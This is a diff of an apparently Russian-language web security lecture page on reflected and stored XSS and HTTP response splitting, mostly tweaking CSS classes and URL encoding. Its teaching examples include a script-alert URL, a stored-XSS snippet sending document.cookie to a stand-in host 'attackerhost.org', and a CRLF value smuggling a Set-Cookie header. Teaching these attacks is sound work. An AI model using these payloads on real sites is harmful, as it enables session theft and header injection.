@@ -86,7 +86,7 @@
 		<h2>0.4.2 XSS:reflected (отраженные)</h2>
 		<ul>
 			<li class="delayed emptyli">
-				<pre class="delayed"><code>http://www.site.com/page.php?var=&lt;script&gt;alert('xss');&lt;/script&gt;</code></pre>
+				<pre><code>http://www.site.com/page.php?var=&lt;script&gt;alert('xss');&lt;/script&gt;</code></pre>
 			</li>
 		</ul>
 	</section>
@@ -95,7 +95,7 @@
 		<h2>0.4.2 XSS:stored (хранимые)</h2>
 		<ul>
 			<li class="delayed emptyli">
-				<pre class="delayed"><code class="javascript">var іmg = new Image();<br>іmg.srс = 'http://attackerhost.org/xss?' + document.cookie;</code></pre>
+				<pre><code class="javascript">var іmg = new Image();<br>іmg.srс = 'http://attackerhost.org/xss?' + document.cookie;</code></pre>
 			</li>
 		</ul>
 	</section>
@@ -137,8 +137,8 @@
 		<ul>
 			<li class="delayed emptyli"><pre><code>http://test.com?jump={user input}</code></pre></li>
 			<li class="delayed emptyli"><pre><code>...<br/>Location: {user input}<br/>...</code></pre></li>
-			<li class="delayed emptyli"><pre><code>http://test.com?jump=hell%0d%0aSet-Cookie: gotohell	%3d1</code></pre></li>
-			<li class="delayed emptyli"><pre><code>...<br/>Location: hell<br/>Set-Cookie = 1<br/>...</code></pre></li>
+			<li class="delayed emptyli"><pre><code>http://test.com?jump=hell%0d%0aSet-Cookie%3A%20gotohell%20%3D%201</code></pre></li>
+			<li class="delayed emptyli"><pre><code>...<br/>Location: hell<br/>Set-Cookie: gotohell = 1<br/>...</code></pre></li>
 		</ul>
 	</section>
 
